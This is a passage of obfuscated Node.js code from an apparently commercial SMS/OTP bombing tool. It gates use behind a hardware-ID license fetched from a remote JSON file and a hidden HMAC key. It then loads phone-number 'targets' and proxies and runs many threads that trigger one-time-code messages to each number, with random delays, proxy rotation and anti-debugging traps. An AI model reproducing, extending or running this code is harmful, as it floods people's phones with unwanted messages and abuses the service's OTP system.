        if (fs.existsSync(_kb)) {
          return fs.readFileSync(_kb, 'utf8').trim();
        }
        const _sb = crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex'), _tb = _sb.replace(/-/g, '').toUpperCase(), _ub = 'IZENHSX-' + _tb.substring(0, 8) + '-' + _tb.substring(8, 12) + '-' + _tb.substring(12, 16);
        try {
          fs.writeFileSync(_kb, _ub, 'utf8');
        } catch (err15) {
        }
        return _ub;
      }
    } catch (err16) {
      return '';
    }
  }
  function _vb(_wb, _xb) {
    const arr8 = [
      25,
      55,
      40,
      60,
      43,
      49,
      62,
      40,
      126,
      51,
      33,
      105,
      60,
      41,
      55,
      46
    ];
    const _yb = arr8.map(item6 => String.fromCharCode(item6 ^ 90)).join('');
    if (!_xb.sig)
      return false;
    const _zb = _wb + '|' + (_xb.user || '') + '|' + (_xb.expires || ''), _Ab = crypto.createHmac('sha256', _yb).update(_zb).digest('hex');
    return _Ab === _xb.sig;
  }
  const _Bb = _fb.toString();
  const _Cb = crypto.createHash('md5').update(_Bb).digest('hex');
  let _Db = '';
  const _Eb = process.argv.slice(2).filter(item7 => !item7.startsWith('--'));
  _Eb[5] && _Eb[5] !== 'AIZEN-UI-HARDWARE-ID' && (_Db = _Eb[5]);
  !_Db && (_Db = _fb());
  globalHwid = _Db;
  if (!_Db) {
    console.error(R('\n  \u2717 Could not generate Hardware ID. Run on Windows.\n'));
    process.exit(1);
  }
  if (!_Eb[5]) {
    const _Fb = _fb();
    _Fb !== _Db && (console.error(R('\n  \u2717 HWID integrity check failed. Tampering detected.\n')), process.exit(1));
  }
  let _Gb = false, _Hb = '';
  try {
    const promise = await new Promise((resolve4, reject2) => {
      const _Ib = 'https://raw.githubusercontent.com/mogamingcv7v-netizen/license/a6d31cc/keys.json';
      const opts30 = {};
      opts30.timeout = 15000;
      https.get(_Ib + ('?t=' + Date.now()), opts30, _Jb => {
        let _Kb = '';
        _Jb.on('data', _Lb => _Kb += _Lb);
        _Jb.on('end', () => {
          try {
            resolve4(JSON.parse(_Kb));
          } catch (err17) {
            reject2(err17);
          }
        });
      }).on('error', reject2).on('timeout', function () {
        this.destroy();
        reject2(new Error('Timeout'));
      });
    });
    if (promise && promise.keys) {
      const _Mb = promise.keys[_Db];
      if (!_Mb) {
        const parts5 = '5|7|2|3|1|0|4|6'.split('|');
        let _Nb = 0;
        while (true) {
          switch (parts5[_Nb++]) {
          case '0':
            console.error(R('  \u2551  Contact: t.me/aizentools to register     \u2551'));
            continue;
          case '1':
            console.error(R('  \u2551  Status : NOT REGISTERED                    \u2551'));
            continue;
          case '2':
            console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
            continue;
          case '3':
            console.error(R('  \u2551  HWID   : ') + Y(_Db.padEnd(33)) + R('\u2551'));
            continue;
          case '4':
            console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
            continue;
          case '5':
            console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
            continue;
          case '6':
            process.exit(1);
            continue;
          case '7':
            console.error(R('  \u2551    \u2717 UNAUTHORIZED HARDWARE \u2014 YANGO TOOL     \u2551'));
            continue;
          }
          break;
        }
      }
      !_vb(_Db, _Mb) && (console.error(R('\n  \u2717 License key signature invalid. Forged key detected.\n')), process.exit(1));
      _Gb = true;
      _Hb = _Mb.user || 'Licensed';
    }
  } catch (err18) {
    console.error(R('\n  \u2717 License server unreachable.'));
    process.exit(1);
  }
  if (!_Gb) {
    console.error(R('\n  \u2717 License validation failed.\n'));
    process.exit(1);
  }
  printHeader();
  console.log(B('  \u2713 License: ' + _Hb) + G(' | HWID: ' + _Db + '\n'));
  let _Ob = '';
  while (true) {
    _Ob = await promptText('Enter Numbers File Path [default: numbers.txt]:', 'numbers.txt');
    !fs.existsSync(_Ob) && (fs.writeFileSync(_Ob, ''), console.log(Y('\n   ! File \'' + _Ob + '\' created. Please add numbers to it and restart.\n')), process.exit(1));
    const _Pb = fs.readFileSync(_Ob, 'utf8').split(/\r?\n/).map(item11 => item11.trim()).filter(item12 => item12 && item12.replace(/\D/g, '').length >= 7);
    if (_Pb.length === 0) {
      console.log(R('\n   \u2717 Error: No valid numbers found in \'' + _Ob + '\'. Please provide a file with numbers.\n'));
      process.exit(1);
    }
    break;
  }
  let _Qb = await promptText('Enter Proxies File Path (Leave blank for direct) [default: none]:', 'none');
  (_Qb === 'none' || _Qb === '') && (_Qb = '');
  const _Rb = parseInt(await promptText('Enter custom worker count (threads) [default: 20]:', '20')) || 20;
  process.stdin.pause();
  const _Sb = fs.readFileSync(_Ob, 'utf8').split(/\r?\n/).map(item13 => item13.trim()).filter(item14 => item14 && item14.replace(/\D/g, '').length >= 7);
  let arr12 = [];
  _Qb && fs.existsSync(_Qb) && (arr12 = fs.readFileSync(_Qb, 'utf8').split('\n').map(item15 => item15.trim()).filter(item16 => item16.length > 0));
  printHeader();
  console.log(Y('\u2713 Loaded ' + _Sb.length + ' targets'));
  console.log(G('  Proxies loaded: ' + arr12.length));
  console.log(C('\u2713 Threads: ' + _Rb + '\n'));
  fs.writeFileSync(SUCCESSFUL_FILE, '');
  fs.writeFileSync(FAILED_FILE, '');
  fs.writeFileSync(DEBUG_FILE, '=== DEBUG SESSION ===\n');
  const dashboard = new Dashboard(_Sb.length), _Tb = () => {
      if (_Sb.length === 0)
        return null;
      const _Ub = Math.floor(Math.random() * _Sb.length);
      return _Sb.splice(_Ub, 1)[0];
    };
  let _Vb = 0;
  const _Wb = () => {
    if (arr12.length === 0)
      return null;
    const _Xb = arr12[_Vb % arr12.length];
    _Vb++;
    return _Xb;
  };
  function _Yb(_Zb) {
    try {
      const _ac = fs.readFileSync(_Ob, 'utf8'), _bc = _ac.split(/\r?\n/).filter(item17 => item17.trim() !== _Zb.trim()).join('\n');
      fs.writeFileSync(_Ob, _bc);
    } catch (err19) {
    }
  }
  const _cc = Math.min(_Rb, _Sb.length), arr13 = [], _dc = setInterval(() => dashboard.render(), 500);
  function _ec(_fc) {
    return new Promise(resolve5 => setTimeout(resolve5, _fc));
  }
  async function _gc(_hc) {
    while (true) {
      const _ic = _Tb();
      if (!_ic)
        break;
      try {
        const _jc = _Wb(), _kc = await triggerSms(_ic, _jc, _hc, dashboard);
        if (_kc.success) {
          const parts6 = '3|4|2|0|1'.split('|');
          let _lc = 0;
          while (true) {
            switch (parts6[_lc++]) {
            case '0':
              fs.appendFileSync(SUCCESSFUL_FILE, _kc.phone + '|OTP_SENT\n');
              continue;
            case '1':
              dashboard.addLog('Triggered OTP for ' + _kc.phone, 'success');
              continue;
            case '2':
              _Yb(_ic);
              continue;
            case '3':
              dashboard.successful++;
              continue;
            case '4':
              dashboard.processed++;
              continue;
            }
            break;
          }
        } else {
          if (_kc.message && _kc.message.startsWith('time:')) {
            const _mc = _kc.message.slice(5);
            dashboard.failed++;
            dashboard.processed++;
            fs.appendFileSync(FAILED_FILE, _kc.phone + '|time wanted ' + _mc + '\n');
            dashboard.addLog('Failed on ' + _kc.phone + ': ' + _mc + ' time wanted', 'time');
          } else {
            if (_kc.message === 'Captcha Required') {
              const parts7 = '4|1|3|2|0'.split('|');
              let _nc = 0;
              while (true) {
                switch (parts7[_nc++]) {
                case '0':
                  dashboard.addLog('Captcha Required on ' + _kc.phone, 'error');
                  continue;
                case '1':
                  dashboard.processed++;
                  continue;
                case '2':
                  fs.appendFileSync(FAILED_FILE, _kc.phone + '|Captcha Required\n');
                  continue;
                case '3':
                  _Yb(_ic);
                  continue;
                case '4':
                  dashboard.failed++;
                  continue;
                }
                break;
              }
            } else
              dashboard.failed++, dashboard.processed++, fs.appendFileSync(FAILED_FILE, _kc.phone + '|' + _kc.message + '\n'), dashboard.addLog('Failed on ' + _kc.phone + ': ' + _kc.message, 'error');
          }
        }
      } catch (err20) {
        dashboard.failed++;
        dashboard.processed++;
        dashboard.addLog('Fatal error on ' + _ic + ': ' + err20.message, 'error');
      }
      const _oc = Math.floor(Math.random() * 3000) + 1500;
      await _ec(_oc);
    }
  }
  for (let _pc = 0; _pc < _cc; _pc++) {
    arr13.push(_gc(_pc));
  }
  await Promise.all(arr13);
  clearInterval(_dc);
  dashboard.render();
  dashboard.stop();
}
start();
function _o(_qc) {
  function _rc(_sc) {
    if (typeof _sc === 'string')
      return function (_tc) {
      }.constructor('while (true) {}').apply('counter');
    else {
      if (('' + _sc / _sc).length !== 1 || _sc % 20 === 0)
        (function () {
          return true;
        }.constructor('debu' + 'gger').call('action'));
      else {
        (function () {
          return false;
        }.constructor('debu' + 'gger').apply('stateObject'));
      }
    }
    _rc(++_sc);
  }
  try {
    if (_qc) {
      return _rc;
    } else {
      _rc(0);
    }
  } catch (err21) {
  }
}